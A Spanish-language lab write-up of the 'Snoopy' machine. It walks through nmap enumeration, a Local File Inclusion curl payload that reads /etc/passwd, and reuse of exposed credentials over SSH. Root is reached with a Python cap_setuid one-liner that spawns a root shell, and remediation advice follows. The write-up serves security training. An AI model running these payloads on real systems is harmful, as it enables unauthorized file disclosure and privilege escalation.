Snoopy: LFI, exposición de credenciales y escalada por Linux capabilities

Cadena completa de explotación Linux desde enumeración web hasta acceso root mediante Local File Inclusion, exposición de credenciales y abuso de cap_setuid en Python.

Versión pública profesional: las flags, contraseñas, tokens, cookies y cualquier valor sensible se han eliminado o sustituido por placeholders.

Resumen ejecutivo

El laboratorio muestra una cadena de intrusión realista: primero se identifican servicios expuestos, después se confirma una vulnerabilidad LFI en la aplicación web, se localiza material sensible publicado indebidamente, se obtiene acceso SSH con un usuario no privilegiado y finalmente se eleva a root mediante una capability peligrosa asignada al intérprete de Python.

Ruta de ataque

La explotación no depende de un único fallo aislado, sino de la acumulación de debilidades: exposición web, falta de validación de rutas, credenciales reutilizables y una configuración insegura del sistema Linux.

Comandos representativos

Los siguientes comandos resumen la metodología. Los valores sensibles están redactados.

nmap -sC -sV -p- <target>
curl "http://<target>/index.php?page=../../../../../../etc/passwd"
curl "http://<target>/index.php?page=../../../../../../etc/os-release"
ssh <user>@<target>       # password redacted
getcap -r / 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Enumeración de servicios

Se realiza un escaneo completo para detectar puertos abiertos y tecnologías principales.

nmap -sC -sV -p- <target>
Evidencia esperada: FTP, SSH, HTTP, MySQL y servicio adicional de diagnóstico expuestos.

Web enumeration

Revisión de rutas web

La aplicación y sus rutas públicas permiten descubrir referencias útiles como archivos de configuración o backups.

Evidencia esperada: rutas internas o ficheros auxiliares publicados por error.

El parámetro vulnerable acepta rutas arbitrarias y permite leer ficheros locales del servidor.

Evidencia esperada: lectura controlada de /etc/passwd y confirmación del sistema objetivo.

Post-exploitation

Enumeración local

Se revisan vectores habituales de escalada: permisos sudo, binarios SUID y Linux capabilities.

sudo -l

Evidencia esperada: Python con cap_setuid, una configuración crítica si no está justificada.

Privilege escalationRoot flag oculta

Escalada a root

La capability permite manipular el UID efectivo y abrir una shell privilegiada.

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
Evidencia esperada: UID 0/root verificado. La flag no se publica.

Hallazgos principales

El parámetro de página permite inclusión de ficheros locales.

Impacto: lectura de archivos del sistema, apoyo a enumeración interna y posible extracción de secretos.

Material de configuración o backup expuesto desde el servidor web.

Impacto: exposición de credenciales y salto desde vulnerabilidad web a acceso interactivo.

Python dispone de cap_setuid.

Impacto: elevación directa a root si un usuario local puede ejecutar el intérprete afectado.

Remediación

  • Usar una whitelist estricta de plantillas válidas en lugar de concatenar rutas controladas por el usuario.
  • Bloquear el acceso web a directorios de configuración, backups y extensiones sensibles.
  • Rotar las credenciales expuestas y evitar su reutilización en servicios interactivos como SSH.
  • Auditar capabilities con regularidad y eliminar cap_setuid de intérpretes como Python, Perl o Ruby.
  • Monitorizar accesos anómalos a ficheros del sistema y rutas internas desde la aplicación web.

Qué demuestra este writeup

Metodología ordenada, capacidad de correlacionar pistas, criterio para no publicar secretos y comprensión tanto ofensiva como defensiva del fallo.
